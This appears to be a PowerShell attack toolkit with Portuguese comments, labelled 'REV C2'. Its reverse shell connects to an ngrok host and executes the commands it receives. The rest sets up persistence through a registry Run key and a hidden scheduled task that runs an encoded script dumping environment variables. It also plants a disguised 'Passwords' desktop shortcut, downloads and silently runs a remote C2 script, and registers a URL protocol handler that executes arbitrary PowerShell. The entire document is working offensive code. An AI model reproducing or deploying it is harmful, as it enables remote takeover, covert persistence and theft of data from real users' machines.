#############
# REV C2    #
#############
do {
 
 Start-Sleep -Seconds 1

 
 try{
 $TCPClient = New-Object Net.Sockets.TCPClient('0.tcp.sa.ngrok.io', 19352)
 } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)


function WriteToStream ($String) {
 
 [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

 
 $StreamWriter.Write($String + 'SHELL> ')
 $StreamWriter.Flush()
}


WriteToStream ''


while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
 
 $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
 
 
 $Output = try {
 Invoke-Expression $Command 2>&1 | Out-String
 } catch {
 $_ | Out-String
 }

 
 WriteToStream ($Output)
}

$StreamWriter.Close()





#######################
# Criar o registro    #
#######################

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Friedrich" -Value "C:\Users\Administrator\Downloads\revc2.exe" -PropertyType String -Force

###############################################
# Persistencia verificando se ja está em exec #
###############################################

$pacote = $env:TEMP
$b64 = "U3RhcnQtVHJhbnNjcmlwdCAtUGF0aCAiJGVudjpURU1QXGxvZy50eHQiCkdldC1DaGlsZEl0ZW0gRW52OgpTdG9wLVRyYW5zY3JpcHQ="
$decodedString = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
echo "$decodedString" > $pacote\coman.ps1

# Adiciona um trecho no script que verifica se já está em execução
$checkScript = @'
if (!(Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {$_.Path -eq "$env:TEMP\coman.ps1"})) {
    Start-Transcript -Path "$env:TEMP\log.txt"
    Get-ChildItem Env:
    Stop-Transcript
}
'@

# Salva a verificação de execução no script `coman.ps1`
Set-Content -Path "$pacote\coman.ps1" -Value $checkScript

# Cria a tarefa agendada para rodar o script com verificação de execução
schtasks.exe /Create /F /TN '{E6ADZA37-C329-4967-9CF5-2682DA7D97BE}' /TR "powershell.exe -ExecutionPolicy Bypass -File $env:TEMP\coman.ps1 -WindowStyle Hidden" -SC MINUTE

# Exibe e limpa o log de saída
type $pacote\log.txt
echo "" > $pacote\log.txt

###############################################
# Criando atalho link                         #
###############################################

# Caminho do atalho e do script PowerShell
$atalhoPath = "$env:USERPROFILE\Desktop\Passwords.lnk"
$scriptPath = "$env:TEMP\my_script.ps1"

# Criar o conteúdo do script PowerShell na pasta TEMP
$scriptContent = 'echo "Arquivo de atalho executado" > "$env:USERPROFILE\Desktop\atalho_executado.txt"'
Set-Content -Path $scriptPath -Value $scriptContent

# Caminho para o executável do PowerShell
$destino = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

# Argumentos para chamar o script .ps1 no PowerShell
$argumentos = "-ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File `"$scriptPath`""

# Criar o atalho
$WshShell = New-Object -ComObject WScript.Shell
$atalho = $WshShell.CreateShortcut($atalhoPath)

# Configurar propriedades do atalho
$atalho.TargetPath = $destino
$atalho.Arguments = $argumentos
$atalho.Description = "Atalho para execução de script PowerShell"
$atalho.Hotkey = "Ctrl+Alt+A"
$atalho.IconLocation = "$env:SystemRoot\System32\imageres.dll, 3"  # Ícone personalizado
$atalho.WindowStyle = 3  # Minimizado
$atalho.Save()

Write-Output "Atalho criado em: $atalhoPath"

###############################################
# baixar c2                                   #
###############################################

$sourceUrl = "http://192.168.1.40/c2-shell.ps1";$destinationPath = "$env:TEMP\Ahhsd-Ett-11333-aADff.ps1";Invoke-RestMethod -Uri $sourceUrl -OutFile $destinationPath;Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\Ahhsd-Ett-11333-aADff.ps1" -WindowStyle Hidden




###############################################
# Persistencia com programas legitimos        #
###############################################

Esse comando pode ser usado para criar uma integração com um protocolo personalizado (como myprotocol:/open), permitindo que aplicativos externos executem comandos PowerShell passando-os por URL. O myprotocol seria, então, substituído por um comando específico do usuário.


powershell.exe -NoExit -ExecutionPolicy Bypass -Command "
    $EncodedParam = [System.Uri]::UnescapeDataString('%1'); 
    if ($EncodedParam -like 'myprotocol:/open*') { 
        $EncodedParam = $EncodedParam -replace 'myprotocol:/open\s?', '' 
    }; 
    Write-Host 'Parametro recebido: $EncodedParam'; 
    Start-Process -NoNewWindow -FilePath 'powershell.exe' -ArgumentList ('-Command', $EncodedParam)
"
